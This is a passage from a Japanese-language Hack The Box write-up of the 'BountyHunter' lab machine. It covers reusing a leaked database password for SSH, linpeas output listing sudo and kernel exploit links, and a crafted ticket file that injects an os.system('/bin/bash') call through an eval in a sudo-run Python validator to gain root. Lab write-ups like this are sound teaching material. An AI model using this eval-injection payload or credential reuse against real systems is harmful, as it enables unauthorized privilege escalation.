variable\">$dbname</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"bounty\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dbusername</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$dbpassword</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"m19RoAU0hP41A1sTsq6K\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$testuser</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span></span></code></pre></div>\n<p>実際に取得できたファイルはこちらでした。</p>\n<p>DBのクレデンシャル情報がベタ打ちされています。</p>\n<p>DBのアクセスエンドポイントは見当たらなかったので次にどうするか迷いましたが、だめもとでSSHのパスワードに使用してみたところ、アクセスに成功し、userを取得できました。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">ssh</span> development@targethost.htb\n<span class=\"token comment\"># m19RoAU0hP41A1sTsq6K</span></code></pre></div>\n<p>次はrootを取得していきます。</p>\n<h2 id=\"権限昇格\" style=\"position:relative;\"><a href=\"#%E6%A8%A9%E9%99%90%E6%98%87%E6%A0%BC\" aria-label=\"権限昇格 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>権限昇格</h2>\n<p>ここからは権限昇格を行っていきます。</p>\n<p>とりあえずlinpeasをかけて、目ぼしい情報を拾いました。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">╔══════════╣ Operative system\n╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation<span class=\"token comment\">#kernel-exploits</span>\nLinux version <span class=\"token number\">5.4</span>.0-80-generic <span class=\"token punctuation\">(</span>buildd@lcy01-amd64-030<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>gcc version <span class=\"token number\">9.3</span>.0 <span class=\"token punctuation\">(</span>Ubuntu <span class=\"token number\">9.3</span>.0-17ubuntu1~20.04<span class=\"token punctuation\">))</span> <span class=\"token comment\">#90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021</span>\nDistributor ID: Ubuntu\nDescription:    Ubuntu <span class=\"token number\">20.04</span>.2 LTS\nRelease:        <span class=\"token number\">20.04</span>\nCodename:       focal\n\n╔══════════╣ Sudo version\n╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation<span class=\"token comment\">#sudo-version</span>\nSudo version <span class=\"token number\">1.8</span>.31\n\nPossible Exploits:\n<span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>CVE-2021-3156<span class=\"token punctuation\">]</span> <span class=\"token function\">sudo</span> Baron Samedit\n\n   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt\n   Exposure: probable\n   Tags: <span class=\"token assign-left variable\">mint</span><span class=\"token operator\">=</span><span class=\"token number\">19</span>,<span class=\"token punctuation\">[</span> <span class=\"token assign-left variable\">ubuntu</span><span class=\"token operator\">=</span><span class=\"token number\">18</span><span class=\"token operator\">|</span><span class=\"token number\">20</span> <span class=\"token punctuation\">]</span>, <span class=\"token assign-left variable\">debian</span><span class=\"token operator\">=</span><span class=\"token number\">10</span>\n   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main\n\n<span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>CVE-2021-3156<span class=\"token punctuation\">]</span> <span class=\"token function\">sudo</span> Baron Samedit <span class=\"token number\">2</span>\n\n   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt\n   Exposure: probable\n   Tags: <span class=\"token assign-left variable\">centos</span><span class=\"token operator\">=</span><span class=\"token number\">6</span><span class=\"token operator\">|</span><span class=\"token number\">7</span><span class=\"token operator\">|</span><span class=\"token number\">8</span>,<span class=\"token punctuation\">[</span> <span class=\"token assign-left variable\">ubuntu</span><span class=\"token operator\">=</span><span class=\"token number\">14</span><span class=\"token operator\">|</span><span class=\"token number\">16</span><span class=\"token operator\">|</span><span class=\"token number\">17</span><span class=\"token operator\">|</span><span class=\"token number\">18</span><span class=\"token operator\">|</span><span class=\"token number\">19</span><span class=\"token operator\">|</span><span class=\"token number\">20</span> <span class=\"token punctuation\">]</span>, <span class=\"token assign-left variable\">debian</span><span class=\"token operator\">=</span><span class=\"token number\">9</span><span class=\"token operator\">|</span><span class=\"token number\">10</span>\n   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main\n\n<span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>CVE-2021-22555<span class=\"token punctuation\">]</span> Netfilter heap out-of-bounds <span class=\"token function\">write</span>\n\n   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html\n   Exposure: probable\n   Tags: <span class=\"token punctuation\">[</span> <span class=\"token assign-left variable\">ubuntu</span><span class=\"token operator\">=</span><span class=\"token number\">20.04</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span>kernel:5.8.0-*<span class=\"token punctuation\">}</span>\n   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c\n   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c\n   Comments: ip_tables kernel module must be loaded\n\n<span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>CVE-2017-5618<span class=\"token punctuation\">]</span> setuid <span class=\"token function\">screen</span> v4.5.0 LPE\n\n   Details: https://seclists.org/oss-sec/2017/q1/184\n   Exposure: <span class=\"token function\">less</span> probable\n   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154\n\n<span class=\"token function\">sudo</span> -l\nMatching Defaults entries <span class=\"token keyword\">for</span> development on bountyhunter:\n    env_reset, mail_badpass, <span class=\"token assign-left variable\">secure_path</span><span class=\"token operator\">=</span>/usr/local/sbin<span class=\"token punctuation\">\\</span>:/usr/local/bin<span class=\"token punctuation\">\\</span>:/usr/sbin<span class=\"token punctuation\">\\</span>:/usr/bin<span class=\"token punctuation\">\\</span>:/sbin<span class=\"token punctuation\">\\</span>:/bin<span class=\"token punctuation\">\\</span>:/snap/bin\n\nUser development may run the following commands on bountyhunter:\n    <span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</code></pre></div>\n<p>いくつか脆弱性もありそうですが、今回はパスワードなしでsudo権限を利用できる<code class=\"language-text\">ticketValidator.py</code>が気になりました。</p>\n<h3 id=\"ticketvalidatorpy\" style=\"position:relative;\"><a href=\"#ticketvalidatorpy\" aria-label=\"ticketvalidatorpy permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ticketValidator.py</h3>\n<p>こんなスクリプトでした。</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\">#Skytrain Inc Ticket Validation System 0.1</span>\n<span class=\"token comment\">#Do not distribute this file.</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">load_file</span><span class=\"token punctuation\">(</span>loc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> loc<span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span><span class=\"token string\">\".md\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>loc<span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Wrong file type.\"</span><span class=\"token punctuation\">)</span>\n        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">evaluate</span><span class=\"token punctuation\">(</span>ticketFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\">#Evaluates a ticket to check for ireggularities.</span>\n    code_line <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n    <span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span>x <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>ticketFile<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> x<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">\"# Skytrain Inc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n            <span class=\"token keyword\">continue</span>\n        <span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> x<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">\"## Ticket to \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Destination: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token string\">' '</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">continue</span>\n\n        <span class=\"token keyword\">if</span> x<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">\"__Ticket Code:__\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            code_line <span class=\"token operator\">=</span> i<span class=\"token operator\">+</span><span class=\"token number\">1</span>\n            <span class=\"token keyword\">continue</span>\n\n        <span class=\"token keyword\">if</span> code_line <span class=\"token keyword\">and</span> i <span class=\"token operator\">==</span> code_line<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> x<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">\"**\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n            ticketCode <span class=\"token operator\">=</span> x<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"**\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"+\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>ticketCode<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">7</span> <span class=\"token operator\">==</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span>\n                validationNumber <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"**\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">if</span> validationNumber <span class=\"token operator\">></span> <span class=\"token number\">100</span><span class=\"token punctuation\">:</span>\n                    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span>\n                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                    <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    fileName <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the path to the ticket file.\\n\"</span><span class=\"token punctuation\">)</span>\n    ticket <span class=\"token operator\">=</span> load_file<span class=\"token punctuation\">(</span>fileName<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#DEBUG print(ticket)</span>\n    result <span class=\"token operator\">=</span> evaluate<span class=\"token punctuation\">(</span>ticket<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Valid ticket.\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid ticket.\"</span><span class=\"token punctuation\">)</span>\n    ticket<span class=\"token punctuation\">.</span>close\n\nmain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>特定のフォーマットのファイルを引数として受け取り、パースするスクリプトのようです。</p>\n<p>システム内を探索すると、チケットのフォーマットがわかりました。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\">#cat /opt/skytrain_inc/invalid_tickets/390681613.md</span>\n\n<span class=\"token comment\"># Skytrain Inc</span>\n<span class=\"token comment\">## Ticket to New Haven</span>\n__Ticket Code:__\n**31+410+86**\n<span class=\"token comment\">##Issued: 2021/04/06</span>\n<span class=\"token comment\">#End Ticket</span></code></pre></div>\n<p>ここで、<code class=\"language-text\">__Ticket Code:__</code>の次の行の<code class=\"language-text\">+</code>で連結された一つ目の数字の7のmodが4の場合に、evalが呼び出されるようです。</p>\n<p>これで、<code class=\"language-text\"></code><strong>31+410+86</strong>`の部分がevalの引数になるので、この中にシェルを起動するコマンドを埋め込んでいこうと思います。</p>\n<p>evalからシェルを呼び出す方法は、こちらのStack Overflowが参考になりました。</p>\n<p>参考：<a href=\"https://stackoverflow.com/questions/59519289/python-running-reverse-shell-inside-eval\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Python - running reverse shell inside eval() - Stack Overflow</a></p>\n<p>というわけで、以下のようなファイルを作成しました。</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\">#cat mal.md</span>\n\n<span class=\"token comment\"># Skytrain Inc</span>\n<span class=\"token comment\">## Ticket to New Haven</span>\n__Ticket Code:__\n**11+100 <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> and __import__<span class=\"token punctuation\">(</span><span class=\"token string\">'os'</span><span class=\"token punctuation\">)</span>.system<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/bash'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> False**\n<span class=\"token comment\">##Issued: 2021/04/06</span>\n<span class=\"token comment\">#End Ticket</span></code></pre></div>\n<p>これをsudo権限で実行した<code class=\"language-text\">ticketValidator.py</code>から呼び出せばrootのシェルが取得できます。</p>\n<h2 id=\"まとめ\" style=\"position:relative;\"><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\" aria-label=\"まとめ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>まとめ</h2>\n<p>マシン名のとおり、自分でバグを見つけ出してrootを取得するというプロセスがあってなかなか面白かったです。</p>","fields":{"slug":"/hackthebox-linux-bugbountyhunter","tagSlugs":["/tag/hack-the-box/","/tag/linux/","/tag/easy-box/"]},"frontmatter":{"date":"2021-11-25","description":"HackTheBoxのリタイアマシン「BountyHunter」のWriteUpです。","tags":["HackTheBox","Linux","EasyBox"],"title":"【Easy/Linux】BugbountyHunter Writeup(HackTheBox)","socialImage":{"publicURL":"/static/dc4d8b7f8795f3c3d3489d9957d155f2/no-image.png"}}}},"pageContext":{"slug":"/hackthebox-linux-bugbountyhunter"}},"staticQueryHashes":["251939775","401334301","825871152"]}